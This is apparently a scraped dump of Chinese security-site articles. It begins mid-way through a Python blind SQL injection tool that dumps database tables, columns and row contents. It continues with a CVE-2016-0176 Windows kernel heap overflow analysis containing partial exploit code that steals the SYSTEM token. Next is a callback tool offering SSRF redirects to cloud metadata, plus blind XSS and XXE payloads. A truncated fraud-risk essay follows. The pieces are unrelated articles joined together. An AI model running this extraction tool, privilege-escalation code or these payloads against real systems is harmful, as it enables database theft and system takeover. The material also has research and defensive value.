table_name from information_schema.tables where table_schema=database() limit '+str(num_4)+',1),'+str(num_6)+',1))&gt;'+str(num_7)                path_sqli=path.replace('$',urllib.quote(sqli_database_name))                conn.request('GET',path_sqli) #获取数据                res=conn.getresponse() #获取数据                res_len=len(res.read()) #获取数据长度                diff=abs(len_ture-res_len) #对比长度                if diff&lt;10:                    min_num=num_7                else:                    max_num=num_7                if max_num-min_num==1:                    table_name.append(chr(max_num))                    break                #print 'min_num:',min_num                #print 'max_num:',max_num            num_6+=1                                        table_name_1=( ''.join(table_name))        tables.append(table_name_1)                print ""数据库中第"",table_NO,""个表的长度："",table_len,"" 表名："",table_name_1                        num_4+=1           while 1:        table_name_2=raw_input(""输入要查看的表名："") #根据上面猜解出来的表名来查看各个表的详细情况            num_7=0        column_num=0        while num_7&lt;100:#猜解表中有多少列,我猜应该不会超过100列吧，这里可以改                        sqli_database_len=' and (select count(column_name) from information_schema.columns where table_name=""'+table_name_2+'"")&gt;'+str(num_7)            #组合注入语句，表中列的个数，注意有的地方表名需要单引号‘’，在这里需要双引号“”            path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path                        conn.request('GET',path_sqli) #获取数据            res=conn.getresponse() #获取数据            res_len=len(res.read()) #获取数据长度            diff=abs(len_ture-res_len) #对比长度                        if diff &gt; 10:#条件长度差小于10即认为正确                            column_num=num_7 #表中的列数                #print column_num                break            num_7+=1        num_8=0        columns_name=[]        while num_8&lt;column_num:#猜解所有表名与长度 这里num_8不得大于上文的表名个数            num_9=0            while num_9&lt;50:#猜列名长度                sqli_database_len=' and (select length(column_name) from information_schema.columns where table_name=""'+table_name_2+'"" limit '+str(num_8)+',1)&gt;'+str(num_9)                #组合注入语句，表中列的个数，注意有的地方表名需要单引号‘’，在这里需要双引号“”                path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path                            conn.request('GET',path_sqli) #获取数据                res=conn.getresponse() #获取数据                res_len=len(res.read()) #获取数据长度                diff=abs(len_ture-res_len) #对比长度                            if diff &gt; 10:#条件长度差小于10即认为正确                                column_len=num_9 #这里就是列名的长度                    #print column_len                    break                num_9+=1            num_10=1            column_name=[]            while num_10&lt;=column_len:#猜列名                min_num=33                max_num=127                        while 1:#二分法猜列名                    num_2=(min_num+max_num)/2                    sqli_database_name=' and ord(mid((select column_name from information_schema.columns where table_name=""'+table_name_2+'"" limit '+str(num_8)+',1),'+str(num_10)+',1))&gt;'+str(num_2)                    #print sqli_database_name                    path_sqli=path.replace('$',urllib.quote(sqli_database_name))                    conn.request('GET',path_sqli) #获取数据                    res=conn.getresponse() #获取数据                    res_len=len(res.read()) #获取数据长度                    diff=abs(len_ture-res_len) #对比长度                    if diff&lt;10:                        min_num=num_2                    else:                        max_num=num_2                    if max_num-min_num==1:                        column_name.append(chr(max_num))                        break                    #print 'min_num:',min_num                    #print 'max_num:',max_num                num_10+=1                                            column_name_1=( ''.join(column_name))            #print column_name_1            columns_name.append(column_name_1)            num_8+=1                print ""表名："",columns_name            shujumax=0 #每列数据数量的最大值        for i in columns_name:            num_11=0            while num_11&lt;1000:                sqli_database_len=' and (select count('+i+') from '+table_name_2+')&gt;'+str(num_11)                #组合注入语句，表中第一列数据的个数，注意有的地方表名需要单引号‘’，在这里需要双引号“”                path_sqli=path.replace('$',urllib.quote(sqli_database_len)) #组合新的path                            conn.request('GET',path_sqli) #获取数据                res=conn.getresponse() #获取数据                res_len=len(res.read()) #获取数据长度                diff=abs(len_ture-res_len) #对比长度                            if diff &gt; 10:#条件长度差小于10即认为正确                                column_shu=num_11 #这里就是列名的长度                    if column_shu&gt;shujumax:                        shujumax=column_shu                                        break                num_11+=1        #print ""最大数量："",shujumax                    num_12=0        while num_12&lt;shujumax:            shujuneirong_1hang=[]            for i in columns_name:                num_13=0                while num_13&lt;50:                                sqli=' and (select length('+i+') from '+table_name_2+' limit '+str(num_12)+',1)&gt;'+str(num_13)                    #and (select length(id) from saiqu limit 0,1)&gt;0                    #组合注入语句，表中第一列数据的个数，注意有的地方表名需要单引号‘’，在这里需要双引号“”                    path_sqli=path.replace('$',urllib.quote(sqli)) #组合新的path                                conn.request('GET',path_sqli) #获取数据                    res=conn.getresponse() #获取数据                    res_len=len(res.read()) #获取数据长度                    diff=abs(len_ture-res_len) #对比长度                                if diff &gt; 10:#条件长度差小于10即认为正确                                    shuju_len=num_13 #这里就是数据的长度                        break                    num_13+=1                #print ""这个数据的长度："",shuju_len                num_14=1                shujuneirong=[]                while num_14&lt;=shuju_len:#猜测数据的内容                                                    min_num=33                    max_num=127                            while 1:#二分法猜列名                        num_2=(min_num+max_num)/2                        sqli_database_name=' and ord(mid((select '+i+' from '+table_name_2+' limit '+str(num_12)+',1),'+str(num_14)+',1))&gt;'+str(num_2)                                            path_sqli=path.replace('$',urllib.quote(sqli_database_name))                        conn.request('GET',path_sqli) #获取数据                        res=conn.getresponse() #获取数据                        res_len=len(res.read()) #获取数据长度                        diff=abs(len_ture-res_len) #对比长度                        if diff&lt;10:                            min_num=num_2                        else:                            max_num=num_2                        if max_num-min_num==1:                            shujuneirong.append(chr(max_num))                            break                        #print 'min_num:',min_num                        #print 'max_num:',max_num                    num_14+=1                                                shujuneirong_1=( ''.join(shujuneirong))                            shujuneirong_1hang.append(shujuneirong_1)            print ""内容："",shujuneirong_1hang            num_12+=1sqlscan()0×05 运行效果记得在输入url的时候在你觉得可能有注入漏洞的地方加一个$符号，如果有注入漏洞并且你要继续注入的话就输入Y，等到跑出所有表名你就可以根据表名来继续注入因为每个字都要猜所以比较慢才能猜出所有内容，所以要有点耐心啊。好啦，这次的内容就这么多了，下次有好东西在分享给大家。","2017-03-12 13:14:37","安全工具","如何手写一款SQL injection tool？","http://nsoad.com/Security-tools/20170312/tools-1111.html"
"5ccbfa1c4f2f0a0a7a69c013","攻破微软的Edge浏览器至少需要包含两方面基本要素：浏览器层面的远程代码执行(RCE: Remote Code Execution)和浏览器沙箱绕过。","kong","如何攻破微软的Edge浏览器攻破微软的Edge浏览器至少需要包含两方面基本要素：浏览器层面的远程代码执行(RCE: Remote Code Execution)和浏览器沙箱绕过。 浏览器层面的远程代码执行通常通过利用Javascript脚本的漏洞完成，而浏览器的沙箱绕过则可以有多种方式，比如用户态的逻辑漏洞，以及通过内核漏洞达到本地提权(EoP: Escalation of Privilege)。微软Edge浏览器使用的沙箱是建立在Windows操作系统的权限检查机制之上的。在Windows操作系统中，资源是可以在全系统范围内被共享的，比如一个文件或者设备可以在不同进程间被共享。由于有些资源里面包含着敏感信息，而另外一些资源的完整性则关乎系统的正常运转，如果被破坏了就会导致整个系统的崩溃。因此当一个进程在访问资源时需要进行严格的权限检查。当一个资源被打开时，主调进程的令牌信息会与目标资源的安全描述符信息进行匹配检查。权限检查由几个不同层面的子检查组成：属主身份及组身份检查，特权检查，完整性级别及可信级别检查，Capability检查等等。上一代的沙箱是基于完整性级别机制的，在沙箱里面运行的应用程序处于Low完整性级别，因此无法访问处于Medium或者更高级别的资源。微软的Edge浏览器采用的是最新一代的沙箱机制，这代沙箱是基于AppContainer的，运行在沙箱里的应用程序依然处于Low完整性级别，当它们尝试访问资源时，除了进行完整性级别检查，还需要进行Capabilities的检查，这种检查更加细腻以及个性化。关于权限检查机制的更多细节，可以参考我在ZeroNights 2015上的演讲：Did You Get Your Token?沙箱绕过的最常用的方法是通过内核态的漏洞利用，直接操作内核对象(DKOM: Direct Kernel Object Manipulation)以达到本地提权。CVE-2016-0176这个漏洞是位于dxgkrnl.sys驱动中，是一个内核堆溢出漏洞。被篡改的数据结构定义如下：typedef struct _D3DKMT_PRESENTHISTORYTOKEN  {    D3DKMT_PRESENT_MODEL  Model; //D3DKMT_PM_REDIRECTED_FLIP      = 2,    UINT                  TokenSize; // 0x438    UINT64                CompositionBindingId;    union    {        D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN        Flip;        D3DKMT_BLTMODEL_PRESENTHISTORYTOKEN         Blt;        D3DKMT_VISTABLTMODEL_PRESENTHISTORYTOKEN    VistaBlt;        D3DKMT_GDIMODEL_PRESENTHISTORYTOKEN         Gdi;        D3DKMT_FENCE_PRESENTHISTORYTOKEN            Fence;        D3DKMT_GDIMODEL_SYSMEM_PRESENTHISTORYTOKEN  GdiSysMem;        D3DKMT_COMPOSITION_PRESENTHISTORYTOKEN      Composition;    }    Token;} D3DKMT_PRESENTHISTORYTOKEN;我们把这个数据结构简称为”history token”，想要激发这个漏洞需要将关键成员变量按如下定义：Model要设置为D3DKMTPMREDIRECTED_FLIP;TokenSize要设置为0x438;你大概已经猜到漏洞是存在在Token.Flip成员里面，该成员类型定义如下：typedef struct _D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN  {    UINT64                                     FenceValue;    ULONG64                                    hLogicalSurface;    UINT_PTR                                   dxgContext;    D3DDDI_VIDEO_PRESENT_SOURCE_ID             VidPnSourceId;    ……    D3DKMT_DIRTYREGIONS                        DirtyRegions;} D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN;继续深入到DirtyRegions的类型定义：typedef struct tagRECT  {    LONG    left;    LONG    top;    LONG    right;    LONG    bottom;} RECT, *PRECT, NEAR *NPRECT, FAR *LPRECT; // 0x10 bytestypedef struct _D3DKMT_DIRTYREGIONS  {    UINT  NumRects;    RECT  Rects[D3DKMT_MAX_PRESENT_HISTORY_RECTS]; // 0x10 * 0x10 = 0x100 bytes     //#define D3DKMT_MAX_PRESENT_HISTORY_RECTS 16} D3DKMT_DIRTYREGIONS;现在我们已经到达了最基本类型的定义, 看到一个成员是DWORD类型的NumRects, 另外一个是数组RECT，其中每个元素的类型是Rects, 这个数组是定长的，有16个元素的空间，每个元素0x10字节，每个这个数组的总长度是0x100字节。上图展示了被篡改的数据结构的布局以及它们之间的关系，左面一栏是我们在调用 Win32 API 函数D3DKMTPresent时从用户态传入的数据结构，中间一栏是dxgkrnl.sys驱动接收到并维护的对应的数据结构，它是从左面一栏的数据结构中拷贝出来的，而右面一栏是内嵌定义在history token中的成员Token.Flip的数据结构。我们知道一个union的大小是由其成员中最大的成员大小决定的，而在这里Token.Flip恰好是unionToken中最大的一个成员，也就是说整个history token数据结构是由Token.Flip中的内容填满直到结尾，这个特征非常重要，大大简化了利用的复杂度。有了上面关于数据结构的知识，我们就可以很方便地理解这个漏洞了，现在展示的是引起漏洞的汇编代码片断：loc_1C009832A: DXGCONTEXT::SubmitPresentHistoryToken(......) + 0x67B          cmp     dword ptr[r15 + 334h], 10h // NumRects        jbe     short loc_1C009834B; Jump if Below or Equal(CF = 1 | ZF = 1)        call    cs : __imp_WdLogNewEntry5_WdAssertion        mov     rcx, rax        mov     qword ptr[rax + 18h], 38h        call    cs : __imp_WdLogEvent5_WdAssertionloc_1C009834B: DXGCONTEXT::SubmitPresentHistoryToken (......) + 0x6B2          mov     eax, [r15 + 334h]        shl     eax, 4        add     eax, 338h        jmp     short loc_1C00983BDloc_1C00983BD: DXGCONTEXT::SubmitPresentHistoryToken (......) + 0x6A5          lea     r8d, [rax + 7]        mov     rdx, r15; Src        mov     eax, 0FFFFFFF8h;        mov     rcx, rsi; Dst        and     r8, rax; Size        call    memmove在这片代码的入口处，r15寄存器指向的是history token结构的内存区域。代码首先从内存区域的0x334偏移处取出一个DWORD，并与0x10进行比较，通过上图我们可以看到取出的DWORD正是Token.Flip.NumRects成员，而0x10则是内嵌数组Token.Flip.Rects容量，所以这里比较的是Token.Flip.NumRects的值是否超出了Token.Flip.Rects数组的容量。如果你是在代码审查时遇到了这段代码，那么你可能会自言自语道大事不妙，微软已经意识到了这个潜在的溢出，并做了比较严格的检查。硬着头皮往下看，当溢出发生时，代码会以assertion的方式将这个异常情况记录到watch dog驱动，但是这个比对后的产生的两个代码分枝最终又都在loc_1C009834B处会合。可能你会想watch dog驱动有机会对代码溢出情况做出反应，通过bug check主动蓝屏(BSOD)，然而事实上什么都没有发生。 不管你对Token.Flip.NumRects这个变量设置什么值，代码都会最终执行到loc_1C009834B处的代码块，这个代码块对Token.Flip.NumRects值做了一些基础的算术运算，并且用运算的结果指定memcpy操作拷贝的长度。为了更加直观地说明问题，把汇编代码改写成对应的C++代码：D3DKMT_PRESENTHISTORYTOKEN* hist_token_src = BufferPassedFromUserMode(…);  D3DKMT_PRESENTHISTORYTOKEN* hist_token_dst = ExpInterlockedPopEntrySList(…);if(hist_token_src-&gt;dirty_regions.NumRects &gt; 0x10)  {    // log via watch dog assertion, NOT work in free/release build}auto size = (hist_token_src-&gt;dirty_regions.NumRects * 0x10 + 0x338 + 7) / 8;  auto src = (uint8_t*)hist_token_src;  auto dst = (uint8_t*)hist_token_dst;  memcpy(dst, src, size);  事情更加简单明了，无论我们给Token.Flip.NumRects指定什么样的值，一个内存拷贝操作在所难免，拷贝操作的源数据正是我们通过调用Win32 API D3DKMTPresent从用户态传入的buffer，拷贝操作的目标是通过调用ExpInterlockedPopEntrySList从内核堆上分配的buffer，而拷贝操作的长度是通过计算拥有Token.Flip.NumRects个元素的数组的长度，再加上数组成员在history token结构体中的偏移，以及因为对齐产生的padding长度。如果我们为Token.Flip.NumRects指定了一个大于0x10的长度，那么内核堆溢出就发生了，我们可以控制溢出的长度，以及溢出的前0x38字节内容(如上面介绍数据结构布局的图所示，在从用户态传入的数据中，我们可以控制history token结构后面的0x38字节数据)。这个漏洞非常有意思，因为微软已经预见了它的存在却没能阻止它的发生，我们可以从中得到的教训是不要滥用编程技巧，除非你知道你自己在干什么，比如assertion机制。利用对于一个堆利用来说，了解目标内存区域附近的内存布局至关重要，我们已经知道目标内存是通过ExpInterlockedPopEntrySList函数在内核态内存池中分配的。通过简单调试，我们可以得到如下内存池信息：kd&gt; u rip-6 L2  dxgkrnl!DXGCONTEXT::SubmitPresentHistoryToken+0x47b:  fffff801`cedb80fb call    qword ptr [dxgkrnl!_imp_ExpInterlockedPopEntrySList (fffff801`ced77338)]  fffff801`cedb8101 test    rax,rax  kd&gt; !pool rax  Pool page ffffc0012764c5a0 region is Paged pool  *ffffc0012764b000 : large page allocation, tag is DxgK, size is 0x2290 bytes    Pooltag DxgK : Vista display driver support, Binary : dxgkrnl.sys这是一个比较大的内存区域，大小为0x2290字节，因为这个大小已经超过了一个内存页的长度(一个内存页是0x1000字节)，所以它是以大页内存(Large Page Allocation)分配的，三个连续内存页被用来响应这次大页内存分配申请，为了节约内存，在0x2290之后的多余空间被回收并且链接到了Paged Pool的free list上面，供后续的小内存分配使用。在0x2290之后，会插入一个起到分隔作用的标记为Frag的内存分配。关于内核内存池及大页分配的详情，参考Tarjei Mandt的白皮书：Kernel Pool Exploitation on Windows 7。下面展示的是在0x2290偏移附近的内存内容：kd&gt; db ffffc0012764b000+0x2290 L40  ffffc001`2764d290  00 01 02 03 46 72 61 67-00 00 00 00 00 00 00 00  ....Frag........  ffffc001`2764d2a0  90 22 00 00 00 00 00 00-00 00 00 00 00 00 00 00  .""..............  ffffc001`2764d2b0  02 01 01 00 46 72 65 65-0b 43 44 9e f1 81 a8 47  ....Free.CD....G  ffffc001`2764d2c0  01 01 04 03 4e 74 46 73-c0 32 42 3a 00 e0 ff ff  ....NtFs.2B:....驱动dxgkrnl.sys中的DXGPRESENTHISTORYTOKENQUEUE::GrowPresentHistoryBuffer函数用来分配并管理一个链接history token的单链表。每个history token的长度是0x438字节，加上内存池分配的头部及padding一共0x450字节，所以0x2290大小的内存被平均分成8个history token，并且以倒序的方式链接在单链表中。驱动dxgkrnl.sys意图将单链表以look-aside list的方式来响应单个history token的内存分配请求。单链表初始状态时如下所示：单链表在响应过一个history token分配请求后如下所示：单链表在响应过两个history token分配请求后如下所示：明确了溢出的目标内存处的内存布局，我们得到两种溢出方案：方案1：溢出0x2290偏移后面的复用的小内存分配空间:方案2：溢出相邻的单链表头部，转化成单链表利用:方案1有诸多限制，因为我们只能控制溢出的前0x38字节内容，这意味着减掉padding空间，用于分隔的frag内存池分配项目的长度以及接下来的内存池分配的头部，我们没有多余发挥的空间。方案2看起来很可行，虽然我们知道Windows内核现在已经强制对双链表进行完整性检查，但是对于单链表没有任何检查，因此我们可以通过覆盖单链表中的next指针达到重定向读写的目标。为了进一步验证可行性，我们先在头脑里演绎一下方案2的种种可能。上面的几张图已经展示了从单链表中弹出两个history token的情形，此时我们可以溢出节点B，让它覆盖节点A的头部，然后我们将节点B压回单链表：当我们把节点A也压回单链表时，接下来会怎样，会不会如我们所料将单链表的读写重定向到被溢出覆盖的next指针处很遗憾并非如我们所料，这种重定向读写不会发生，因为当我们将节点A压回单链表时，覆盖的QWORD会恢复成指向节点B的指针：我们回到已经弹出两个节点的状态再尝试另外一种可能： 这次我们先将节点A压回单链表:然后我们溢出节点B，以覆盖节点A的头部，因为此时节点A已经被回收进单链表，所以不会再有任何操作可以将子节点A的头部恢复了。现在单链表已经被破坏了，它的第二个元素已经指向了溢出覆盖的QWORD所指向的内存处。:经过了上面的演绎，我们对方案2信心十足，现在我们就开始动手吧！看起来我们必须对单链表乱序调用push和pop，至少要有两次连续的pop，我做了如下的尝试：尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。结果失败了，经过调试发现每次都在重复pop节点A，使用后push节点A这个循环，根本不会产生乱序。原因很简单，循环调用D3DKMTPresent被逐个响应，所以我们必须同时调用它才能产生乱序。尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。结果又失败了，经过一些简单的逆向分析，D3DKMTPresent的调用路径应该是被加锁保护了。经历了两次挫败，不免开始怀疑人生，是否会出现两次连续的pop呢？然后很快就意识到绝对可行，肯定是我姿势不对，否则这相对复杂的单链表就退化成单个变量了，肯定有其他的内核调用路径可以激发单链表pop操作。我编写了一个windbg脚本记录每次push和pop操作，然后尝试打开一些图形操作密集的应用程序，只要发现了两次连续的pop就证明发现了第二条路径。经过简单的尝试，奇迹出现了，当我打开Solitaire游戏时，两次pop出现了，经过简单的调试，发现BitBlt API会触发第二条pop的内核路径。尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。这一次终于成功地将单链表中的next指针重定向到指定位置，达到了内核态任意地址写的目的。但是这种写的能力有限，很难重复，而我们想要通过DKOM方式偷换令牌需要多次内核读写，而这种矛盾在Pwn2Own 2016的3次尝试总时间15分钟的严苛比赛规则下显得更加突出，我们需要一些其他技巧。其他技巧如何达到可重复的内核态任意地址读写为了达到这个目标，我使用win32k的位图bitmap对象作为中间目标。首先向内核态内存中spray大量的bitmap对象，然后猜测它们的位置，并试图通过上面的重定向写技巧修改它们的头部，当我成功地命中第一个bitmap对象后，通过修改它的头部中的buffer指针和长度，让其指向第二个bitmap对象。因此总共需要控制两个bitmap对象，第一个用来控制读写的地址，而第二个用来控制读写的内容。再详细地讲，我一共向内核内存中spray了4GB的bitmap对象，首先通过喷射大尺寸的256MB的bitmap对象来锁定空间以及引导内存对齐，然后将它们逐个替换成1MB的小尺寸bitmap对象，这些对象肯定位于0x100000的边界处，就使得猜测它们的地址更加简单。在猜测bitmap对象地址的过程中需要信息泄露来加快猜测速度，这是通过user32! gSharedInfo完成的。偷换令牌有了可重复地任意地址读写的能力后，再加上通过sidt泄露内核模块的地址，我们可以方便地定位到nt!PspCidTable指向的句柄表，然后从中找出当前进程以及system进程对应的EPROCESS结构体，进而找到各自的TOKEN结构的地址，从而完成替换。部分利用代码VOID ThPresent(THREAD_HOST * th)  {    SIZE_T hint = 0;    while (TRUE)    {        HIST_TOKEN ht = { 0, };        HtInitialize(&amp;ht);        SIZE_T victim_surf_obj = ThNextGuessedAddr(th, ++hint);        SIZE_T buffer_ptr = victim_surf_obj + 0x200000 + 0x18;        th-&gt;backupBufferPtr1 = victim_surf_obj + 0x258;        th-&gt;backupBufferPtr2 = victim_surf_obj + 0x200000 + 0x258;        SIZE_T back_offset = 0x10;        SURFOBJ surf_obj = { 0, };        surf_obj.cjBits = 0x80;        surf_obj.pvBits = (PVOID)buffer_ptr;        surf_obj.pvScan0 = (PVOID)buffer_ptr;        surf_obj.sizlBitmap.cx = 0x04;        surf_obj.sizlBitmap.cy = 0x08;        surf_obj.iBitmapFormat = 0x06;        surf_obj.iType = 0;        surf_obj.fjBitmap = 0x01;        surf_obj.lDelta = 0x10;        DWORD dwBuff = 0x04800200;        HtSetBuffer(&amp;ht, 0x18 + th-&gt;memberOffset - back_offset, (unsigned char*)&amp;surf_obj, 0x68);        HtSetBuffer(&amp;ht, 0x70 + th-&gt;memberOffset - back_offset, &amp;dwBuff, sizeof(DWORD));        if (th-&gt;memberOffset - back_offset + 0xE8 &lt; 0x448)        {            SIZE_T qwBuff = victim_surf_obj + 0xE0;            HtSetBuffer(&amp;ht, 0xE0 + th-&gt;memberOffset - back_offset, &amp;qwBuff, sizeof(SIZE_T));            HtSetBuffer(&amp;ht, 0xE8 + th-&gt;memberOffset - back_offset, &amp;qwBuff, sizeof(SIZE_T));        }        if (th-&gt;memberOffset - back_offset + 0x1C0 &lt; 0x448)        {            SIZE_T qwBuff = victim_surf_obj + 0x1B8;            HtSetBuffer(&amp;ht, 0x1B8 + th-&gt;memberOffset - back_offset, &amp;qwBuff, sizeof(SIZE_T));            HtSetBuffer(&amp;ht, 0x1C0 + th-&gt;memberOffset - back_offset, &amp;qwBuff, sizeof(SIZE_T));        }        HtOverflowNextSListEntry(&amp;ht, victim_surf_obj);        HtTrigger(&amp;ht);        if (th-&gt;triggered)            break;    }}VOID ThTrigger(THREAD_HOST * th)  {    SIZE_T i = 0;    HANDLE threads[TH_MAX_THREADS] = { 0, };    unsigned char second_buffer[0x78] = { 0, };    for (SIZE_T i = 0; i &lt; TH_MAX_THREADS; i++)    {        if (th-&gt;triggered)        {            break;        }        if (i == 9)        {            DWORD thread_id = 0;            threads[i] = CreateThread(NULL, 0, ProbeThreadProc, th, 0, &amp;thread_id);        }        else if (i % 3 != 0 &amp;&amp; i &gt; 0x10)        {            DWORD thread_id = 0;            threads[i] = CreateThread(NULL, 0, PresentThreadProc, th, 0, &amp;thread_id);        }                   else        {            DWORD thread_id = 0;            threads[i] = CreateThread(NULL, 0, BitbltThreadProc, th, 0, &amp;thread_id);        }    }    for (i = 0; i &lt; TH_MAX_THREADS; i++)    {        if (threads[i] != NULL)        {            if (WAIT_OBJECT_0 == WaitForSingleObject(threads[i], INFINITE))            {                CloseHandle(threads[i]);                threads[i] = NULL;            }        }    }    Log(""trigged\n"");    ThRead(th, (const void*)th-&gt;backupBufferPtr2, second_buffer, 0x78);    ADDR_RESOLVER ar = { 0, };    ArInitialize(&amp;ar, th);    SIZE_T nt_addr = ArNTBase(&amp;ar);     SIZE_T psp_cid_table_addr = nt_addr + PSP_CIDTABLE_OFFSET;    SIZE_T psp_cid_table_value;    ThRead(th, psp_cid_table_addr, &amp;psp_cid_table_value, 0x08);    SIZE_T psp_cid_table[0x0C] = { 0, };    ThRead(th, psp_cid_table_value, psp_cid_table, 0x60);    SIZE_T table_code = psp_cid_table[1];    SIZE_T handle_count = psp_cid_table[0x0B] &amp; 0x00000000ffffffff;    SIZE_T curr_pid = GetCurrentProcessId();    do    {        ThParseCidTable(th, table_code, handle_count);        Sleep(1000);    } while (th-&gt;currentEprocess == NULL || th-&gt;systemEprocess == NULL);    SIZE_T curr_proc = th-&gt;currentEprocess;    SIZE_T system_proc = th-&gt;systemEprocess;    SIZE_T system_token = 0;    ThRead(th, (system_proc + 0x358), &amp;system_token, 0x08);    SIZE_T curr_token = 0;    ThRead(th, (curr_proc + 0x358), &amp;curr_token, 0x08);    ThWrite(th, (curr_proc + 0x358), &amp;system_token, 0x08);    ThRead(th, (curr_proc + 0x358), &amp;curr_token, 0x08);    ThRestore(th);    Log(""elevated\n"");    Sleep(3600000);    return;}","2016-11-21 00:17:47","Web安全","A Link to System Privilege - CVE-2016-0176 漏洞及利用详解","http://nsoad.com/Article/web/20161121/822.html"
"5ccbfa1c4f2f0a0a7a69c014","Burp Suite是一款信息安全从业人员必备的集 成型的渗透测试工具，它采用自动测试和半自动测试的方式，包含了 Proxy,Spid....","Alpha_h4ck","今天给大家介绍的是运行在我自己Web服务器中的一堆脚本，这些脚本可以帮助我快速检测SSRF、Blind XXS以及XXE漏洞，喜欢的朋友可以将它们部署到自己的环境中。当然了，你们也可以根据自己的需要来自定义修改脚本代码。Ground-Control（GitHub传送门）我这个GitHub库中托管的是我在服务器端所部属的一些安全增强脚本，它们可以检测SSRF（服务器端请求伪造），Blind XSS、以及XXE漏洞。目前本项目仍处于更新过程中，因为我现在还在收集相关的脚本。在使用这些脚本之前，我通常会重写脚本中的部分代码或通过netcat设置监听器。但这样做的灵活性就非常差了，因此我才决定将这些脚本都上传到一个代码库上，这样每当服务器需要使用某个脚本时，我们就可以直接从GitHub代码库中克隆下来即可。必备条件脚本的运行需要Ruby 2.3、域名的有效SSL证书、以及一台能够开启端口80、443、8080和8443的Web服务器。端口80和443用来处理简单的Web流量；端口8080也是一个HTTP端口，当端口80无法正常访问时可以用端口8080来处理网络通信数据；端口8443是一个用来处理HTTPS流量的替代段藕，不同的是它需要使用自签名的SSL证书，我可以使用这个端口来判断服务器的SSL证书是否有效。工具配置将该项目克隆到本地，然后通过运行“install.sh“来安装本工具的必备组件。依赖组件安装完成之后，运行“start.sh”来监听所有的端口。因为脚本需要监听端口80和433，因此我们还需要root权限才行，但是在将来的版本中我们会尝试通过切换用户环境来解决这个问题。功能介绍Redirects／redirect节点用来将一个请求重定向到另一台服务器或网络节点，当你需要一台外部服务器请求重定向到内部系统时，你可以使用这项功能。使用样例如下：curl -vv ""http://server/redirect?url=http://169.254.169.254/latest/meta-data/""Ping Pong有时你可能需要一个能够响应指定body和header的页面，而／ping_pong节点就是你所需要的。使用样例如下：curl -vv ""http://server/ping_pong?body=%3ch1%3eHello%3c/h1%3e""Blind Callback如果你想要知道一个无法直接访问的系统是否执行了你的HTML代码或XSS Payload，你可以在config.json文件中添加一个callback_tokens参数，数据结构如下所示：{  ""callback_tokens"": {    ""ee34a1791ab345f789"": {      ""host"":""hackerone.com"",      ""port"": 443,      ""ssl"": true,      ""path"": ""/webhooks"",      ""parameter"": ""url"",      ""method"": ""POST""    }  }}这个callback中包含了攻击目标（插入Payload的地方）的相关信息，如果你收到了一个callback，那么它将可以帮助你验证漏洞出现的根本原因。需要注意的是，其中的每一个参数（parameter、host、port、path和method）都需要拥有自己的callback_token。你可以根据你所要测试的漏洞类型来构建自己的Payload，下面给出的是针对HTML注入漏洞和XSS漏洞的测试用例。接下来，将你的Payload通过注入点提交给服务器。当带有callback_token的请求被触发之后，你将能够在logs/access_log中查看到日志记录。绝大多数情况下，我会使用命令“tail -f logs/access_log”来查看漏洞和请求的触发情况。HTML注入：&lt;img src=""https://server/pixel?callback_token=ee34a1791ab345f789"" style=""display:none;""/&gt;Blind XSS：&lt;script src=""https://server/collect?callback_token=ee34a1791ab345f789""&gt;&lt;/script&gt;XXE：&lt;?xmlversion=""1.0"" ?&gt;&lt;!DOCTYPEr [&lt;!ELEMENTr ANY &gt;&lt;!ENTITYsp SYSTEM ""http://server/pixel?callback_token=ee34a1791ab345f789""&gt;]&gt;&lt;r&gt;&amp;sp;&lt;/r&gt;开启另一台服务器服务器默认会监听端口80、443、8080、8443，但如果你想开启另外一台服务器来监听其他端口的话，你可以运行命令“ruby app/server.rb -p :port”。如果你想使用SSL，你可以在刚才的命令后面添加“-cert :cert.pem”。当一个潜在的SSRF漏洞只允许我们连接特定端口的话，这个功能就非常有用了。","2017-06-20 15:50:02","安全工具","一款用于发现SSRF、XXE、XSS漏洞的小工具","http://nsoad.com/Security-tools/20170620/tools-1160.html"
"5ccbfa1c4f2f0a0a7a69c015","之前写过一篇关于支付风控体系设计的文章，但是对于互联网电商而言，支付环节的风险仅仅是一环。","kong","之前写过一篇关于支付风控体系设计的文章，但是对于互联网电商而言，支付环节的风险仅仅是一环，对于很多没有能力构建风控系统的中小创企业而言，他们觉得自己不在乎多花点手续费选择网银、第三方支付方式来规避支付环节的风险，但是中小创企业就能天真的以为他们的业务安全了么，恩，真的是too young too 天真（抱歉，从小用汉字标注英文发音的我表示这个单词不会写~）。在互联网行业做风控，首先需要学会的是，你要知道你的对手是谁、他们是怎么做的、他们想做什么、他们在哪做、他们什么时候做（who，how，what，where，when），这样才能不断提高现有的业务风控水平，在不断变化的业务环境中get到新业务可能存在的风险点并做好对预知风险的防范措施。所谓道魔互博，只有对对手足够了解，才能不断提高风险防范水平，在用户感知不到的节点为所有业务部门提供业务的支撑保护。不以盈利为目的的黑产都不是好黑产，如下图：当然，我这里指的仅仅是电商/信贷行业的业务风险，对于互联网这个圈子而言，会被黑产盯上的行业太多，比如游戏私服、网络彩票、色情赌博等，但凡有利益的行业都会有人去干；而企业面临的黑产风险类型也很多，主要分为技术风险与业务风险，大体上可以如下分类，为了配合本文行文方便，对我所已知的风险做了如下分类：表1：互联网行业面临的风险分类当然这里对风险的分类其实并不准确，但是结合我之前的工作，本文想阐述的仅仅是表格中的阴影部分，这些风险点对于企业而言就犹如溃坝的蚁穴一般，单个风险点损失不是很大，几千几万的损失而已，但是不加控制就会全节点开花。因此对于一家略微成熟的互联网企业，所面临的风险一定是多层次全方位的，单单只对一个节点的控制是远远不能满足业务发展的需要的。另外，很想跟大家说的一点是，很多业务风险的黑色产业从业者基本没有太高的技术水平，他们是整个环节的下游部分，基于网络上形形色色的数据信息来钻公司流程规则的漏洞。这些对于业务风险点的风控体系设计后续可能会单独另开一篇文章，但是作为一名立志要干好风控的同学来说，知己知彼，知道这些业务风险的黑色产业链对于做好风险点的业务防控至关重要，这么好学的宝宝真是一个励志的boy。当然，从业这么长时间来，通过各种途径接触了形形色色的黑产介入的欺诈场景，也在与同行的交流中收益良多。黑产看似离我们很遥远，但是其实就在黑产早已遍布我们的身边，离我们是如此之